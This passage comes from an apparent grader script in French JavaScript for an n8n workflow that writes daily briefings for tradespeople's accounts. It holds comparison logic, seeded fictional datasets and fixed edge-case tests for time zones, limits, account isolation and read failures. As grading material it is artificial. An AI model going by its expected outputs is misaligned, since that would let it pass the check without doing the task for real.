  const p = point[0], b = bilan[0]
  const att = attendu(base, app)
  const lignes = new Map()
  for (const l of p.a_ecrire ?? []) {
    if (lignes.has(l.artisan_id)) ko(`${titre} : deux lignes pour le compte ${l.artisan_id}`)
    lignes.set(l.artisan_id, l)
  }
  if (p.jour !== app.jour || b.jour !== app.jour) ko(`${titre} : jour ${p.jour}, ${app.jour} attendu (Paris)`)
  let lus = 0, muets = 0, muetsCrm = 0, horsOffre = 0
  const par = { impayes: 0, conversations: 0, devis_sans_reponse: 0, stock_bas: 0 }
  for (const [id, a] of att) {
    lus++
    const l = lignes.get(id)
    const ou = `${titre} : compte ${id.slice(-4)}`
    if (a.horsOffre) { horsOffre++; if (l) ko(`${ou} : hors de l'offre de l'assistant, et pourtant une ligne`); continue }
    if (a.muet) {
      muets++; if (a.crm) muetsCrm++
      if (l) ko(`${ou} : aucune rubrique, et pourtant une ligne (un compte sans priorité se tait)`)
      continue
    }
    if (!l) { ko(`${ou} : ${a.rubriques.map((r) => r.rubrique).join(', ')} attendues, aucune ligne`); continue }
    if (l.cle !== `point_du_jour:${id}:${app.jour}`) ko(`${ou} : clé ${l.cle}`)
    if (l.jour !== app.jour) ko(`${ou} : jour ${l.jour}`)
    const pj = l.point_du_jour ?? {}
    const rn = pj.rubriques ?? []
    if (rn.map((r) => r.rubrique).join(',') !== a.rubriques.map((r) => r.rubrique).join(',')) ko(`${ou} : rubriques [${rn.map((r) => r.rubrique)}], [${a.rubriques.map((r) => r.rubrique)}] attendues (ordre de composerBriefing)`)
    for (const ra of a.rubriques) {
      const r = rn.find((x) => x.rubrique === ra.rubrique)
      if (!r) continue
      if (r.nombre !== ra.nombre) ko(`${ou} : ${ra.rubrique} : ${r.nombre} objets, ${ra.nombre} attendus`)
      if (r.lignes_non_montrees !== ra.lignes_non_montrees) ko(`${ou} : ${ra.rubrique} : ${r.lignes_non_montrees} lignes non montrées, ${ra.lignes_non_montrees} attendues`)
      if (ra.rubrique === 'stock_bas') {
        // L'écran range le stock par nom, que n8n ne lit pas : comparé comme un ensemble (écart déclaré au brief).
        if (ra.nombre <= LISTE_MAX ? !memes(r.objets ?? [], ra.objets) : (r.objets ?? []).length !== ra.objets.length || (r.objets ?? []).some((x) => !a.alertesToutes.includes(x))) ko(`${ou} : stock_bas : objets différents de l'alerte de l'écran Inventaire`)
      } else if ((r.objets ?? []).join(',') !== ra.objets.join(',')) ko(`${ou} : ${ra.rubrique} : objets ou ordre des objets différents de composerBriefing`)
    }
    // Urgences : les conversations et les impayés dans l'ordre exact ; le stock, comme un ensemble.
    const un = pj.urgences ?? {}
    if (un.nombre !== a.urgences.nombre) ko(`${ou} : ${un.nombre} urgences, ${a.urgences.nombre} attendues`)
    const hors = (l2) => (l2 ?? []).filter((x) => x.rubrique !== 'stock_bas').map((x) => x.rubrique + ':' + x.id).join(',')
    if (hors(un.objets) !== hors(a.urgences.objets)) ko(`${ou} : urgences (demandes, impayés) différentes de composerBriefing`)
    const sn = (un.objets ?? []).filter((x) => x.rubrique === 'stock_bas').map((x) => x.id), sa = a.urgences.objets.filter((x) => x.rubrique === 'stock_bas').map((x) => x.id)
    if (a.urgences.nombre <= LISTE_MAX ? !memes(sn, sa) : sn.length !== sa.length || sn.some((x) => !a.epuisesTous.includes(x))) ko(`${ou} : urgences de stock différentes`)
    if ((un.objets ?? []).some((x) => !['conversations', 'impayes', 'stock_bas'].includes(x.rubrique))) ko(`${ou} : urgence d'une rubrique inconnue`)
    if (!egal(pj.chiffres, a.chiffres)) ko(`${ou} : chiffres ${JSON.stringify(pj.chiffres)}, ${JSON.stringify(a.chiffres)} attendus`)
    if (!egal(pj.rubriques_hors_n8n, a.crm ? HORS_N8N : [])) ko(`${ou} : rubriques hors n8n ${JSON.stringify(pj.rubriques_hors_n8n)} (CRM : ${a.crm})`)
    if (!egal(pj.rubriques_hors_offre, a.horsOffreR)) ko(`${ou} : rubriques hors de l'offre ${JSON.stringify(pj.rubriques_hors_offre)}`)
    // Les trois priorités (Q1, défaut) : l'argent qui dort, puis les clients qui attendent, puis le reste dans l'ordre de composerBriefing.
    const pa = ORDRE_Q1.map((r) => a.rubriques.find((x) => x.rubrique === r)).filter(Boolean).slice(0, 3)
    const pr = l.priorites ?? []
    if (pr.map((x) => x.rubrique).join(',') !== pa.map((x) => x.rubrique).join(',')) ko(`${ou} : priorités [${pr.map((x) => x.rubrique)}], [${pa.map((x) => x.rubrique)}] attendues (Q1)`)
    pa.forEach((x, i) => {
      const q = pr[i]
      if (!q) return
      par[x.rubrique]++
      if (q.rang !== i + 1 || q.nombre !== x.nombre) ko(`${ou} : priorité ${i + 1} : rang ou nombre faux`)
      const premierOk = x.rubrique === 'stock_bas' ? a.alertesToutes.includes(q.premier_objet) : q.premier_objet === x.objets[0]
      if (!premierOk) ko(`${ou} : priorité ${i + 1} (${x.rubrique}) : premier objet ${q.premier_objet}, ${x.objets[0]} attendu`)
    })
  }
  for (const id of lignes.keys()) if (!att.has(id)) ko(`${titre} : une ligne pour un compte qui n'en a pas (${id}) : autre compte, démonstration, suppression ou hors offre`)
  const bilanAttendu = { mode: 'simulation', jour: app.jour, comptes_lus: lus, comptes_avec_point_du_jour: lus - muets - horsOffre, comptes_muets: muets, comptes_muets_rubriques_hors_n8n: muetsCrm, comptes_hors_offre: horsOffre, priorites_par_rubrique: par }
  if (!egal(b, bilanAttendu)) ko(`${titre} : bilan ${JSON.stringify(b)}, ${JSON.stringify(bilanAttendu)} attendu`)
}

// ─── 5. Les jeux de données fictifs ─────────────────────────────────────────────────────────────────────────────────────────────
// Identifiants inventés `00000000-0000-4000-8000-…`, noms remplacés par des jetons de lettres, aucune donnée réelle.
const u = (n) => '00000000-0000-4000-8000-' + n.toString(16).padStart(12, '0')
class Base {
  constructor() { this.n = 0x100; this.nj = 0; this.jetons = {}; this.db = { artisans: [], leads: [], messages: [], devis: [], factures: [], materiaux: [], stock: [] } }
  id() { return u(++this.n) }
  nommer(id, num) { const t = jeton(num + 1000 * ++this.nj); if (this.jetons[t]) throw new Error('jeton en double'); this.jetons[t] = id; return t }
  compte(plan = 'studio', o = {}) { const id = this.id(); this.db.artisans.push({ id, plan, est_demo: false, suppression_demandee_le: null, ...o }); return id }
  demande(compte, o = {}) { const id = o.id ?? this.id(); this.db.leads.push({ statut: 'nouveau', urgence: null, lu_le: null, updated_at: horodate(Date.UTC(2026, 9, 1)), ...o, id, artisan_id: compte, nom_prospect: this.nommer(id, this.n), contact: 'masqué', message: 'texte du client' }); return id }
  message(lead, o = {}) { this.db.messages.push({ sens: 'in', etat: null, sent_at: horodate(Date.UTC(2026, 9, 1)), ...o, id: this.id(), lead_id: lead, type: 'reponse', contenu: 'texte du client' }) }
  devis(compte, o = {}) { const id = o.id ?? this.id(); this.db.devis.push({ statut: 'envoye', total_ttc: 100, envoye_le: horodate(Date.UTC(2026, 9, 1)), ...o, id, artisan_id: compte, numero: this.nommer(id, this.n), client_nom: 'nom du client' }); return id }
  facture(compte, o = {}) { const id = o.id ?? this.id(); this.db.factures.push({ statut: 'emise', date_emission: '2026-09-01', date_echeance: '2026-10-01', total_ttc: 100, avoir_de: null, ...o, id, artisan_id: compte, numero: this.nommer(id, this.n), client_nom: 'nom du client' }); return id }
  materiau(compte, seuil, quantites = [], o = {}) {
    const id = this.id()
    // Le nom suit un autre ordre que l'identifiant : l'écran range par nom, n8n par identifiant.
    this.db.materiaux.push({ seuil_alerte: seuil, unite: 'u', ...o, id, artisan_id: compte, nom: this.nommer(id, 50000000 + ((this.n * 7919) % 1000003)) })
    quantites.forEach((q, i) => this.db.stock.push({ id: this.id(), materiau_id: id, lieu: 'lieu ' + i, quantite: q }))
    return id
  }
}
/** Un générateur pseudo-aléatoire à graine fixe (mulberry32) : les mêmes jeux à chaque passage. */
const alea = (graine) => () => { graine |= 0; graine = (graine + 0x6d2b79f5) | 0; let t = Math.imul(graine ^ (graine >>> 15), 1 | graine); t = (t + Math.imul(t ^ (t >>> 7), 61 | t)) ^ t; return ((t ^ (t >>> 14)) >>> 0) / 4294967296 }
const STATUTS_DEMANDE = ['nouveau', 'nouveau', 'en_discussion', 'devis', 'repondu', 'en_cours', 'gagne', 'perdu', null, ''] // app/plateforme/Conversations.tsx:27-34
const JOURS_ALEA = ['2026-11-03', '2026-11-17', '2026-07-08', '2026-03-29', '2026-03-30', '2026-10-25', '2026-10-26', '2026-01-01', '2026-12-31']
function jeuAleatoire(graine) {
  const r = alea(graine)
  const tirer = (l) => l[Math.floor(r() * l.length)]
  const ent = (a, b) => a + Math.floor(r() * (b - a + 1))
  const B = new Base()
  const jour = tirer(JOURS_ALEA)
  const instant = horodateParis(jour, 7, 30)
  const t0 = Date.parse(instant)
  const ilYa = (jours, heureParis = null) => {
    if (heureParis === null) return t0 - jours * 86400e3 - ent(0, 86399) * 1000
    const d = new Date(t0 - jours * 86400e3)
    return msParis(jourParis(d), heureParis[0], heureParis[1])
  }
  const ts = (ms) => horodate(ms, r() < 0.3 ? ent(0, 999999) : null)
  const nbComptes = ent(1, 4)
  const comptes = []
  for (let i = 0; i < nbComptes; i++) comptes.push(B.compte(tirer(OFFRES)))
  if (r() < 0.3) comptes.push(B.compte(tirer(['gratuit', 'essentiel', 'business'])))
  if (r() < 0.2) comptes.push(B.compte('studio', { est_demo: true }))
  if (r() < 0.2) comptes.push(B.compte('signature', { suppression_demandee_le: horodate(t0 - 86400e3) }))
  const HORS = u(0xfffff) // un compte jamais lu
  for (const c of [...comptes, ...(r() < 0.3 ? [HORS] : [])]) {
    const grand = r() < 0.12
    const nbDemandes = grand ? ent(150, 230) : ent(0, 25)
    const egalite = horodate(ilYa(ent(0, 20)))
    for (let k = 0; k < nbDemandes; k++) {
      const l = B.demande(c, { statut: tirer(STATUTS_DEMANDE), urgence: tirer(['urgent', 'normal', null, null]), lu_le: r() < 0.5 ? null : ts(ilYa(ent(0, 10))),
        updated_at: r() < 0.05 ? null : r() < 0.1 ? egalite : ts(ilYa(ent(0, 40), r() < 0.2 ? [23, 0] : null)) })
      const nbm = ent(0, 3)
      const egaliteM = horodate(ilYa(ent(0, 10)))
      for (let q = 0; q < nbm; q++) B.message(l, { sens: tirer(['in', 'out']), etat: tirer([null, null, 'proposition', 'rejete']), sent_at: r() < 0.15 ? egaliteM : ts(ilYa(ent(0, 30))) })
    }
    const nbDevis = r() < 0.08 ? ent(195, 205) : ent(0, 14)
    for (let k = 0; k < nbDevis; k++) {
      const age = ent(0, 40)
      B.devis(c, { statut: r() < 0.85 ? 'envoye' : tirer(['brouillon', 'accepte', 'refuse', 'expire']), total_ttc: r() < 0.1 ? null : ent(1, 900000) / 100,
        envoye_le: r() < 0.05 ? null : ts(ilYa(age, tirer([null, [0, 30], [23, 30], [0, 0], [23, 59]]))) })
    }
    const nbFact = r() < 0.06 ? ent(52, 70) : ent(0, 18)
    const facts = []
    for (let k = 0; k < nbFact; k++) {
      const emission = jourParis(new Date(ilYa(ent(0, 120))))
      const ech = r() < 0.15 ? null : jourParis(new Date(ilYa(ent(-30, 90))))
      facts.push(B.facture(c, { statut: tirer(['emise', 'emise', 'emise', 'payee', 'annulee', 'brouillon']), date_emission: r() < 0.04 ? null : emission, date_echeance: ech, total_ttc: r() < 0.05 ? null : ent(1, 2000000) / 100 }))
    }
    for (let k = 0; k < Math.floor(nbFact / 8); k++) B.facture(c, { statut: 'emise', avoir_de: tirer(facts), total_ttc: -10 })
    const nbMat = ent(0, 12)
    for (let k = 0; k < nbMat; k++) B.materiau(c, tirer([0, 0, 1, 2, 3, 5, 2.5]), Array.from({ length: ent(0, 3) }, () => tirer([0, 1, 2, 3, 4, -1, 0.5, 1.5])))
  }
  return { base: B, instant }
}

/** Un cas fixe ou tiré : le passage de n8n rejoué, comparé à la référence. Rend la sortie, pour d'autres contrôles. */
async function jouer(titre, wf, base, instant, ko, o = {}) {
  const r = await rejouer(wf, base, instant, o)
  if (r.erreur || r.arret) { ko(`${titre} : le passage s'est arrêté (${r.noeud ?? r.arret} : ${r.erreur ?? r.raison})`); return null }
  comparer(titre, base, briefingApp(base, instant), r.sorties, ko)
  return r.sorties
}

// ─── 6. Les cas fixes (a) à (l) ────────────────────────────────────────────────────────────────────────────────────────────────
const STATS = {}
const ligneDe = (sortie, compte) => (sortie?.['Point du jour par compte']?.[0]?.a_ecrire ?? []).find((l) => l.artisan_id === compte)
const objetsDe = (l, rubrique) => l?.point_du_jour?.rubriques?.find((x) => x.rubrique === rubrique)?.objets ?? []
async function casFixes(wf, ko, { rapide = false } = {}) {
  let n = 0
  const jouerCas = async (titre, base, instant, o) => { n++; return jouer(titre, wf, base, instant, ko, o) }

  // (a) La demande arrivée la veille à 23 h (Paris), jamais lue, figure au point du jour de 7 h 30 : hiver, été, nuit du changement
  // d'heure (25/10/2026). Une demande non lue de trois jours aussi (aucune fenêtre « 24 h » ni « depuis minuit »).
  for (const [jour, veille] of [['2026-11-17', '2026-11-16'], ['2026-07-08', '2026-07-07'], ['2026-10-25', '2026-10-24'], ['2026-03-29', '2026-03-28']]) {
    const B = new Base()
    const a = B.compte('studio')
    const tard = B.demande(a, { updated_at: horodate(msParis(veille, 23, 0)) })
    const vieille = B.demande(a, { updated_at: horodate(msParis(veille, 10, 0) - 2 * 86400e3) })
    const s = await jouerCas(`(a) demande de 23 h, ${jour}`, B, horodateParis(jour, 7, 30))
    const objets = objetsDe(ligneDe(s, a), 'conversations')
    if (s && (!objets.includes(tard) || !objets.includes(vieille))) ko(`(a) ${jour} : la demande de la veille à 23 h et celle de trois jours doivent attendre l'artisan`)
  }
  // (b) Un devis envoyé à 0 h 30 de Paris compte ses jours à Paris : 6 jours à Paris (absent), 7 en UTC (il serait présent).
  for (const [jour, envoi, present] of [['2026-11-17', '2026-11-11', false], ['2026-11-17', '2026-11-10', true], ['2026-07-08', '2026-07-02', false]]) {
    const B = new Base()
    const a = B.compte('studio')
    const d = B.devis(a, { envoye_le: horodate(msParis(envoi, 0, 30)) })
    const s = await jouerCas(`(b) devis de 0 h 30 le ${envoi}`, B, horodateParis(jour, 7, 30))
    if (s && objetsDe(ligneDe(s, a), 'devis_sans_reponse').includes(d) !== present) ko(`(b) devis envoyé à 0 h 30 de Paris le ${envoi}, jour du ${jour} : ${present ? 'présent' : 'absent'} attendu (jours comptés à Paris)`)
  }
  // (c) Le jour vide : comptes sans rien, aucune ligne, un bilan à zéro ; un compte vide parmi d'autres se tait.
  {
    const B = new Base()
    const comptes = [B.compte('studio'), B.compte('signature'), B.compte('entreprise')]
    const s = await jouerCas('(c) tous vides', B, horodateParis('2026-11-03', 7, 30))
    const p = s?.['Point du jour par compte']?.[0], b = s?.['Bilan du passage']?.[0]
    if (s && (p.a_ecrire.length || b.comptes_avec_point_du_jour || b.comptes_muets !== 3 || b.comptes_lus !== 3 || Object.values(b.priorites_par_rubrique).some((x) => x))) ko('(c) tous vides : aucune ligne à écrire et un bilan à zéro attendus')
    const B2 = new Base()
    const vide = B2.compte('studio'), plein = B2.compte('studio')
    B2.demande(plein)
    const s2 = await jouerCas('(c) un compte vide parmi d’autres', B2, horodateParis('2026-11-03', 7, 30))
    if (s2 && (ligneDe(s2, vide) || !ligneDe(s2, plein))) ko('(c) le compte vide se tait, l’autre a son point du jour')
    void comptes
  }
  // (d) Les limites : 51 conversations, 51 impayés, 9 lignes ; la fenêtre de 200 demandes, deux paquets de messages, un paquet plafonné
  // à 1 000 messages ; 201 devis envoyés (les 200 plus anciens) ; 2 001 factures (la plus ancienne, seule échue, hors des 2 000).
  {
    const B = new Base()
    const a = B.compte('studio'), c2 = B.compte('signature'), c3 = B.compte('entreprise'), c4 = B.compte('studio')
    const t0 = msParis('2026-11-17', 7, 30)
    for (let k = 0; k < 51; k++) B.demande(a, { updated_at: horodate(t0 - (k + 1) * 3600e3), urgence: k % 7 ? null : 'urgent' })
    for (let k = 0; k < 51; k++) B.facture(a, { date_emission: '2026-08-01', date_echeance: jourParis(new Date(t0 - (k + 1) * 86400e3)), total_ttc: 10 + k })
    for (let k = 0; k < 9; k++) B.devis(a, { envoye_le: horodate(t0 - (8 + k) * 86400e3) })
    for (let k = 0; k < 230; k++) {
      const l = B.demande(c2, { updated_at: horodate(t0 - (k + 1) * 600e3), statut: k % 3 ? 'repondu' : 'nouveau', lu_le: k % 2 ? horodate(t0 - 86400e3) : null })
      // Un paquet plafonné : 1 100 messages récents sur une demande ; la réponse proposée la plus ancienne et les messages plus anciens
      // des autres demandes du paquet tombent hors des 1 000 lus, chez l'app comme dans n8n.
      if (k === 5) for (let q = 0; q < 1100; q++) B.message(l, { sens: 'out', etat: q === 0 ? 'proposition' : null, sent_at: horodate(t0 - (2000 - q) * 60e3) })
      if (k % 4 === 0) B.message(l, { sens: 'in', sent_at: horodate(t0 - (k < 100 ? 3000 : 60) * 60e3) })
    }
    for (let k = 0; k < 201; k++) B.devis(c3, { envoye_le: horodate(t0 - (10 + k) * 3600e3 * 24) })
    for (let k = 0; k < 2000; k++) B.facture(c4, { statut: 'payee', date_emission: jourParis(new Date(t0 - (k % 300) * 86400e3)) })
    B.facture(c4, { statut: 'emise', date_emission: '2025-01-01', date_echeance: '2025-02-01' })
    const s = await jouerCas('(d) limites', B, horodateParis('2026-11-17', 7, 30))
    const l = ligneDe(s, a)
    const r = (x) => l?.point_du_jour?.rubriques?.find((y) => y.rubrique === x)
    if (s && (r('conversations')?.nombre !== 50 || r('conversations')?.lignes_non_montrees !== 42 || l.point_du_jour.chiffres.conversations_en_attente !== 51)) ko('(d) 51 conversations : 50 rendues, 42 non montrées, 51 en attente attendus')
    if (s && (r('impayes')?.nombre !== 50 || l.point_du_jour.chiffres.factures_impayees !== 51)) ko('(d) 51 impayés : 50 listés, 51 comptés attendus')
    if (s && (r('devis_sans_reponse')?.nombre !== 9 || r('devis_sans_reponse')?.lignes_non_montrees !== 1)) ko('(d) 9 devis : 9 comptés, 1 non montré attendus')
    if (s && ligneDe(s, c3)?.point_du_jour?.rubriques?.find((y) => y.rubrique === 'devis_sans_reponse')?.nombre !== 200) ko('(d) 201 devis envoyés : 200 lus attendus')
    if (s && ligneDe(s, c4)) ko('(d) 2 001 factures : la plus ancienne est hors des 2 000 lues, aucune ligne attendue')
  }
  // (e) Un objet d'un autre compte n'entre jamais : lignes d'un compte non lu glissées dans les lectures (hors de tout filtre), et un
  // même identifiant dans deux comptes (données incohérentes) : chacun garde le sien.
  {
    const B = new Base()
    const a = B.compte('studio'), bb = B.compte('studio'), HORS = u(0xeeeee)
    const commun = u(0xddddd)
    B.demande(a, { id: commun, statut: 'gagne' })
    B.demande(bb, { id: commun, statut: 'nouveau' })
    B.devis(a, { id: u(0xddddc), envoye_le: horodate(msParis('2026-11-03', 10, 0) - 20 * 86400e3) })
    B.devis(bb, { id: u(0xddddc), envoye_le: horodate(msParis('2026-11-03', 10, 0) - 30 * 86400e3) })
    B.facture(bb, { id: u(0xddddb), date_echeance: '2026-10-01' })
    B.facture(a, { id: u(0xddddb), statut: 'payee' })
    B.materiau(a, 3, [1])
    const injections = {
      'Lire demandes': [{ id: u(0xeeee1), artisan_id: HORS, statut: 'nouveau', urgence: 'urgent', lu_le: null, updated_at: horodate(Date.UTC(2026, 10, 2)) }],
      'Lire devis envoyés': [{ id: u(0xeeee2), artisan_id: HORS, statut: 'envoye', total_ttc: 1, envoye_le: horodate(Date.UTC(2026, 8, 1)) }],
      'Lire factures': [{ id: u(0xeeee3), artisan_id: HORS, statut: 'emise', date_emission: '2026-01-01', date_echeance: '2026-02-01', total_ttc: 5, avoir_de: null }],
      'Lire matériaux suivis': [{ id: u(0xeeee4), artisan_id: HORS, seuil_alerte: 3 }],
    }
    const s = await jouerCas('(e) autre compte et identifiant partagé', B, horodateParis('2026-11-03', 7, 30), { injections })
    if (s && JSON.stringify(s).includes(HORS)) ko('(e) un objet d’un compte non lu est entré dans la sortie')
  }
  // (f) Un compte de démonstration, en suppression ou hors offre n'a rien, même avec des données.
  {
    const B = new Base()
    const garde = B.compte('studio')
    const autres = [B.compte('studio', { est_demo: true }), B.compte('signature', { suppression_demandee_le: horodate(Date.UTC(2026, 9, 20)) }), B.compte('business'), B.compte('essentiel'), B.compte('gratuit')]
    for (const c of [garde, ...autres]) { B.demande(c); B.facture(c); B.devis(c, { envoye_le: horodate(Date.UTC(2026, 8, 1)) }); B.materiau(c, 2, [0]) }
    const s = await jouerCas('(f) démonstration, suppression, hors offre', B, horodateParis('2026-11-03', 7, 30))
    if (s && (!ligneDe(s, garde) || autres.some((c) => ligneDe(s, c)))) ko('(f) seul le compte Studio ordinaire a son point du jour')
  }
  // (g) Un compte CRM nomme ses rubriques hors n8n et n'est jamais dit vide ; sans rien, il se tait et le bilan le compte à part.
  {
    const B = new Base()
    const plein = B.compte('signature'), vide = B.compte('signature'), studio = B.compte('studio')
    B.demande(plein); B.demande(studio)
    const s = await jouerCas('(g) CRM', B, horodateParis('2026-11-03', 7, 30))
    if (s && !egal(ligneDe(s, plein)?.point_du_jour?.rubriques_hors_n8n, HORS_N8N)) ko('(g) compte CRM : rubriques hors n8n nommées attendues')
    if (s && ligneDe(s, vide)) ko('(g) compte CRM sans rubrique lue : il se tait')
    if (s && s['Bilan du passage'][0].comptes_muets_rubriques_hors_n8n !== 1) ko('(g) le bilan compte à part le compte CRM muet')
    if (s && !egal(ligneDe(s, studio)?.point_du_jour?.rubriques_hors_n8n, [])) ko('(g) compte Studio : aucune rubrique hors n8n')
  }
  // (h) Deux rejeux du même passage donnent les mêmes lignes (même clé, même contenu).
  {
    const { base, instant } = jeuAleatoire(4242)
    const s1 = await jouerCas('(h) premier passage', base, instant)
    const s2 = await jouerCas('(h) second passage', base, instant)
    if (s1 && s2 && canon(s1) !== canon(s2)) ko('(h) deux passages identiques ne donnent pas les mêmes lignes')
  }
  // (i) Les trois priorités suivent le défaut de Q1.
  {
    const B = new Base()
    const tout = B.compte('studio'), deux = B.compte('studio'), seul = B.compte('studio')
    const t0 = msParis('2026-11-03', 7, 30)
    B.demande(tout); B.devis(tout, { envoye_le: horodate(t0 - 9 * 86400e3) }); B.facture(tout, { date_echeance: '2026-10-01' }); B.materiau(tout, 2, [1])
    B.demande(deux); B.materiau(deux, 2, [0])
    B.devis(seul, { envoye_le: horodate(t0 - 8 * 86400e3) })
    const s = await jouerCas('(i) priorités', B, horodateParis('2026-11-03', 7, 30))
    const pr = (c) => (ligneDe(s, c)?.priorites ?? []).map((x) => x.rubrique).join(',')
    if (s && (pr(tout) !== 'impayes,conversations,devis_sans_reponse' || pr(deux) !== 'conversations,stock_bas' || pr(seul) !== 'devis_sans_reponse')) ko(`(i) priorités : ${pr(tout)} | ${pr(deux)} | ${pr(seul)}`)
  }
  // (j) Une lecture en panne ou qui n'a pas tourné n'est jamais prise pour une lecture vide : le passage s'arrête, sans point du jour.
  {
    const { base, instant } = jeuAleatoire(777)
    for (const [nom] of CHAINE.filter(([, t]) => t === T.http)) {
      n++
      const r1 = await rejouer(wf, base, instant, { pannes: [nom] })
      if (!r1.arret) ko(`(j) ${nom} en panne : le passage doit s'arrêter`)
      const r2 = await rejouer(wf, base, instant, { absentes: [nom] })
      if (!r2.erreur || r2.sorties) ko(`(j) ${nom} absente : un nœud Code l'a prise pour vide (${r2.sorties ? 'point du jour rendu' : r2.raison})`)
    }
  }
  // (k) Une lecture qui atteint son plafond de pages (50 × 1 000 lignes) arrête le passage ; une ligne inattendue aussi.
  if (!rapide) {
    for (const table of ['factures', 'leads']) {
      const B = new Base()
      const a = B.compte('studio')
      for (let k = 0; k < 50000; k++) {
        const id = u(0x200000 + k)
        if (table === 'factures') B.db.factures.push({ id, artisan_id: a, statut: 'payee', date_emission: '2026-01-01', date_echeance: null, total_ttc: 1, avoir_de: null })
        else B.db.leads.push({ id, artisan_id: a, statut: 'gagne', urgence: null, lu_le: null, updated_at: null })
      }
      n++
      const r = await rejouer(wf, B, horodateParis('2026-11-03', 7, 30))
      if (!r.erreur || !/plafond/.test(r.erreur)) ko(`(k) ${table} : 50 000 lignes, le plafond de pages doit arrêter le passage (${r.erreur ?? 'aucun arrêt'})`)
    }
  }
  {
    const B = new Base()
    const a = B.compte('studio')
    B.demande(a)
    for (const [nom, ligne] of [['Lire factures', { id: u(0xccc1), artisan_id: a, statut: 'emise', date_emission: null, date_echeance: null, total_ttc: 1, avoir_de: null, contenu: 'texte' }],
      ['Lire devis envoyés', { id: 'pas-un-identifiant', artisan_id: a, statut: 'envoye', total_ttc: 1, envoye_le: null }],
      ['Lire demandes', { id: u(0xccc2), artisan_id: a, statut: 'nouveau', urgence: null, lu_le: null }]]) {
      n++
      const r = await rejouer(wf, B, horodateParis('2026-11-03', 7, 30), { injections: { [nom]: [ligne] } })
      if (!r.erreur) ko(`(k) ${nom} : une ligne inattendue doit arrêter le passage`)
    }
  }
  // (l) Une lecture vide (élément vide de alwaysOutputData) n'est pas une panne : le passage va au bilan.
  {
    const B = new Base()
    B.compte('studio')
    await jouerCas('(l) tables vides', B, horodateParis('2026-11-03', 7, 30))
  }
  STATS.casFixes = n
}

/** Plusieurs centaines de jeux tirés au hasard, à graine fixe. */
async function casAleatoires(wf, ko, nombre, graine0 = 1, arret = () => false) {
  let jeux = 0, lignes = 0
  const parRubrique = { conversations: 0, devis_sans_reponse: 0, impayes: 0, stock_bas: 0 }
  for (let g = graine0; g < graine0 + nombre; g++) {
    const { base, instant } = jeuAleatoire(g)
    const s = await jouer(`jeu tiré n° ${g}`, wf, base, instant, ko)
    jeux++
    for (const l of s?.['Point du jour par compte']?.[0]?.a_ecrire ?? []) { lignes++; for (const r of l.point_du_jour.rubriques) parRubrique[r.rubrique]++ }
    if (arret()) break
  }
  STATS.aleatoires = { jeux, lignes, parRubrique }
}

// ─── 7. L'essai n8n (test_workflow sur données épinglées) rejoué hors ligne ───────────────────────────────────────────────────────
// Trois comptes inventés : un Studio avec des impayés, un devis à J+7 et une demande arrivée la veille à 23 h ; un Signature, qui a le
// CRM ; un Studio sans aucune priorité, qui doit rester muet. Les données épinglées sont ce que le simulateur tire de ce jeu.
const INSTANT_ESSAI = '2026-11-03T07:30:00.000+01:00'
function jeuEssai() {
  const B = new Base()
  const studio = B.compte('studio'), signature = B.compte('signature'), muet = B.compte('studio')
  const t0 = Date.parse(INSTANT_ESSAI)
  B.demande(studio, { updated_at: horodate(msParis('2026-11-02', 23, 0)) })
  B.demande(studio, { statut: 'repondu', lu_le: horodate(t0 - 3 * 86400e3), updated_at: horodate(t0 - 3 * 86400e3) })
  B.facture(studio, { date_emission: '2026-09-01', date_echeance: '2026-09-15', total_ttc: 1250.5 })
  B.facture(studio, { date_emission: '2026-10-10', date_echeance: '2026-10-25', total_ttc: 480 })
  B.facture(studio, { date_emission: '2026-10-20', date_echeance: '2026-11-20', total_ttc: 300 })
  B.devis(studio, { envoye_le: horodate(msParis('2026-10-27', 9, 15)), total_ttc: 2400 })
  B.devis(studio, { envoye_le: horodate(msParis('2026-10-31', 9, 15)), total_ttc: 900 })
  const l = B.demande(signature, { statut: 'en_discussion', lu_le: horodate(t0 - 86400e3), updated_at: horodate(t0 - 5 * 3600e3), urgence: 'urgent' })
  B.message(l, { sens: 'out', sent_at: horodate(t0 - 6 * 3600e3) })
  B.message(l, { sens: 'in', sent_at: horodate(t0 - 5 * 3600e3) })
  B.materiau(signature, 4, [0])
  B.materiau(signature, 2, [5])
  B.facture(signature, { statut: 'payee', date_emission: '2026-10-01', date_echeance: '2026-10-15' })
  B.devis(muet, { statut: 'accepte', envoye_le: horodate(t0 - 20 * 86400e3) })
  B.facture(muet, { statut: 'payee' })
  return { base: B, instant: INSTANT_ESSAI, comptes: { studio, signature, muet } }
}
async function donneesEpinglees(wf) {
  const { base, instant } = jeuEssai()
  const r = await rejouer(wf, base, instant, { avecLectures: true })
  if (r.erreur || r.arret) throw new Error(`essai : le passage s'arrête (${r.erreur ?? r.raison})`)
  const pin = { [DECLENCHEUR]: [{ json: { timestamp: instant } }] }
  for (const [nom, items] of Object.entries(r.lectures)) pin[nom] = items.map((j) => ({ json: j }))
  return pin
}
async function essai(wf) {
  const e = []
  const ko = (m) => e.push(m)
  if (!existsSync(FICHIERS.essai)) return ['essai.json manquant (.orchestre/preuves/032-013/essai.json)']
  let es
  try { es = JSON.parse(lire(FICHIERS.essai)) } catch (err) { return [`essai.json illisible : ${err.message}`] }
  if (!(Number(es.execution_id) > 0)) ko('essai.json : numéro d’exécution n8n attendu (execution_id)')
  if (es.statut !== 'success') ko(`essai.json : exécution n8n en succès attendue (${es.statut})`)
  for (const v of JSON.stringify(es).match(/[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/g) ?? []) if (!UUID_INVENTE.test(v) && v !== REPLI) ko(`essai.json : identifiant non inventé (${v})`)
  try {
    const attendues = await donneesEpinglees(wf)
    if (!egal(es.pinData, attendues)) ko('essai.json : les données épinglées ne sont pas celles du jeu ESSAI du juge')
    const { base, instant } = jeuEssai()
    const epinglees = Object.fromEntries(Object.entries(es.pinData ?? {}).map(([k, v]) => [k, (v ?? []).map((x) => x.json)]))
    const r = await rejouer(wf, base, instant, { epinglees })
    if (r.erreur || r.arret) ko(`essai : rejeu arrêté (${r.erreur ?? r.raison})`)
    else {
      for (const nom of GARDER) if (!egal(r.sorties[nom], es.sortie_n8n?.[nom])) ko(`essai : le rejeu hors ligne ne rend pas la sortie que n8n a rendue (${nom})`)
      comparer('essai n8n', base, briefingApp(base, instant), es.sortie_n8n, ko)
    }
  } catch (err) { ko(`essai : ${err.message}`) }
  return e
}

// ─── 8. Le brief et la preuve ──────────────────────────────────────────────────────────────────────────────────────────────────
function brief() {
  const e = []
